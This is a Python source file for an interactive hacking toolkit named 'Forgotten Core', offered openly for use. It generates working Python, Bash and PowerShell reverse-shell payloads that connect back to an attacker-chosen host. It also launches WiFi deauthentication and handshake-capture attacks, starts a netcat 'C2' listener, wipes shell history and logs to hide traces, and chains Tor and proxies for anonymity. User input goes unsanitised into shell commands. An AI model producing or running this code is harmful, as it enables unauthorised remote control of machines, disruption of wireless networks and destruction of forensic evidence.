#!/usr/bin/env python3
import os
import sys
import time
import random
import subprocess
import threading
import socket
import base64
import hashlib
import requests
from datetime import datetime

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

class ForgottenCore:
    def __init__(self):
        self.version = "1.0.0"
        self.user = "forgotten"
        self.host = "void"
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.shadow_dir = f"{self.void_dir}/shadow_payloads"
        os.makedirs(self.void_dir, exist_ok=True)
        os.makedirs(self.shadow_dir, exist_ok=True)
        
    def get_path(self):
        """Get current directory like pwd"""
        return os.getcwd().replace(os.path.expanduser("~"), "~")
    
    def prompt(self):
        """Kali Linux style prompt"""
        path = self.get_path()
        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.GREEN}{self.user}@{Colors.CYAN}{self.host}{Colors.RED})-{Colors.BLUE}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
    
    def banner(self):
        """Cool banner"""
        banner = f"""
{Colors.RED}{Colors.BOLD}
    ╔═══════════════════════════════════════════════════════════════╗
    ║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗
    ║  ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║
    ║  █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║
    ║  ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║
    ║  ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║
    ║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝
    ║                         ██████╗ ██████╗ ██████╗ ███████╗            
    ║                        ██╔════╝██╔═══██╗██╔══██╗██╔════╝            
    ║                        ██║     ██║   ██║██████╔╝█████╗              
    ║                        ██║     ██║   ██║██╔══██╗██╔══╝              
    ║                        ╚██████╗╚██████╔╝██║  ██║███████╗            
    ║                         ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝            
    ╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.DIM}                    "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
        print(banner)
    
    def show_help(self):
        """Show available commands"""
        help_text = f"""
{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    AVAILABLE COMMANDS                             ║
╠═══════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.GREEN}
  {Colors.BOLD}[01]{Colors.END} {Colors.WHITE}wifi / w{Colors.DIM}        - WiFi attacks (deauth, scan, handshake){Colors.END}
  {Colors.GREEN}[02]{Colors.END} {Colors.WHITE}payload / p{Colors.DIM}    - Generate reverse shell payloads{Colors.END}
  {Colors.GREEN}[03]{Colors.END} {Colors.WHITE}c2 / server{Colors.DIM}     - Start C2 / listener server{Colors.END}
  {Colors.GREEN}[04]{Colors.END} {Colors.WHITE}stealth / s{Colors.DIM}     - Clean traces, wipe logs{Colors.END}
  {Colors.GREEN}[05]{Colors.END} {Colors.WHITE}anon / a{Colors.DIM}        - Anonymity (Tor, proxy chain){Colors.END}
  {Colors.GREEN}[06]{Colors.END} {Colors.WHITE}clear / cls{Colors.DIM}     - Clear screen{Colors.END}
  {Colors.GREEN}[07]{Colors.END} {Colors.WHITE}help / ?{Colors.DIM}        - Show this help{Colors.END}
  {Colors.GREEN}[08]{Colors.END} {Colors.WHITE}exit / quit{Colors.DIM}     - Exit Forgotten Core{Colors.END}
{Colors.CYAN}╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(help_text)
    
    def clear_screen(self):
        os.system("clear")
        self.banner()
    
    def wifi_attack(self):
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID WIFI ATTACKS                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Deauth Attack
{Colors.GREEN}[2]{Colors.WHITE} Scan Networks
{Colors.GREEN}[3]{Colors.WHITE} Capture Handshake
{Colors.GREEN}[4]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            iface = input(f"{self.prompt()}interface > ")
            bssid = input(f"{self.prompt()}target bssid > ")
            os.system(f"aireplay-ng --deauth 10 -a {bssid} {iface}")
        elif choice == '2':
            iface = input(f"{self.prompt()}interface > ")
            os.system(f"airodump-ng {iface}")
        elif choice == '3':
            iface = input(f"{self.prompt()}interface > ")
            bssid = input(f"{self.prompt()}bssid > ")
            channel = input(f"{self.prompt()}channel > ")
            os.system(f"airodump-ng --bssid {bssid} -c {channel} --write handshake {iface}")
    
    def generate_payload(self):
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    ABYSS PAYLOAD GENERATOR                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Python Reverse Shell
{Colors.GREEN}[2]{Colors.WHITE} Bash Reverse Shell
{Colors.GREEN}[3]{Colors.WHITE} PowerShell Reverse Shell
{Colors.GREEN}[4]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice in ['1', '2', '3', '4']:
            if choice == '4':
                return
                
        lhost = input(f"{self.prompt()}LHOST > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        if choice == '1':
            payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
            filename = f"{self.shadow_dir}/payload_{int(time.time())}.py"
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
            print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
        elif choice == '2':
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            filename = f"{self.shadow_dir}/payload_{int(time.time())}.sh"
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
            print(f"{Colors.CYAN}[*] Run: bash {filename}{Colors.END}")
        elif choice == '3':
            payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
            filename = f"{self.shadow_dir}/payload_{int(time.time())}.ps1"
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}")
            print(f"{Colors.CYAN}[*] Run: powershell -ExecutionPolicy Bypass -File {filename}{Colors.END}")
    
    def start_c2(self):
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    SPECTRE C2 SERVER                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} HTTP Server (python)
{Colors.GREEN}[2]{Colors.WHITE} Netcat Listener
{Colors.GREEN}[3]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            port = input(f"{self.prompt()}port (80) > ") or "80"
            print(f"{Colors.CYAN}[*] Starting HTTP server on port {port}{Colors.END}")
            os.system(f"python3 -m http.server {port}")
        elif choice == '2':
            port = input(f"{self.prompt()}port (4444) > ") or "4444"
            print(f"{Colors.CYAN}[*] Starting netcat listener on port {port}{Colors.END}")
            os.system(f"nc -lvnp {port}")
    
    def stealth_clean(self):
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    CRYPT STEALTH CLEANER                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Wipe Bash History
{Colors.GREEN}[2]{Colors.WHITE} Clear Logs
{Colors.GREEN}[3]{Colors.WHITE} Full Forensic Cleanup
{Colors.GREEN}[4]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            print(f"{Colors.GREEN}[+] Bash history wiped{Colors.END}")
        elif choice == '2':
            os.system("rm -rf /data/data/com.termux/files/usr/var/log/* 2>/dev/null")
            print(f"{Colors.GREEN}[+] Logs cleared{Colors.END}")
        elif choice == '3':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
    
    def anonymity(self):
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID ANONYMITY MODULE                             ║
║              "Vanish without a trace"                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Start Tor
{Colors.GREEN}[2]{Colors.WHITE} Check Current IP
{Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)
{Colors.GREEN}[4]{Colors.WHITE} Full Anonymity (Tor + Proxy)
{Colors.GREEN}[5]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("tor &")
            print(f"{Colors.GREEN}[+] Tor started on port 9050{Colors.END}")
        elif choice == '2':
            print(f"{Colors.CYAN}[*] Current IP:{Colors.END}")
            os.system("curl -s ifconfig.me")
            print()
        elif choice == '3':
            print(f"{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
        elif choice == '4':
            os.system("tor &")
            time.sleep(3)
            print(f"{Colors.CYAN}[*] Full anonymity activated!{Colors.END}")
            print(f"{Colors.CYAN}[*] Your IP now:{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
    
    def run(self):
        self.clear_screen()
        
        while True:
            try:
                cmd = input(self.prompt()).strip().lower()
                
                if cmd in ['wifi', 'w']:
                    self.wifi_attack()
                elif cmd in ['payload', 'p']:
                    self.generate_payload()
                elif cmd in ['c2', 'server']:
                    self.start_c2()
                elif cmd in ['stealth', 's']:
                    self.stealth_clean()
                elif cmd in ['anon', 'a']:
                    self.anonymity()
                elif cmd in ['clear', 'cls']:
                    self.clear_screen()
                elif cmd in ['help', '?', 'menu']:
                    self.show_help()
                elif cmd in ['exit', 'quit']:
                    print(f"{Colors.RED}[!] Returning to void...{Colors.END}")
                    sys.exit(0)
                elif cmd == '':
                    continue
                else:
                    print(f"{Colors.RED}[!] Unknown command: {cmd}. Type 'help' for available commands.{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    core = ForgottenCore()
    core.run()
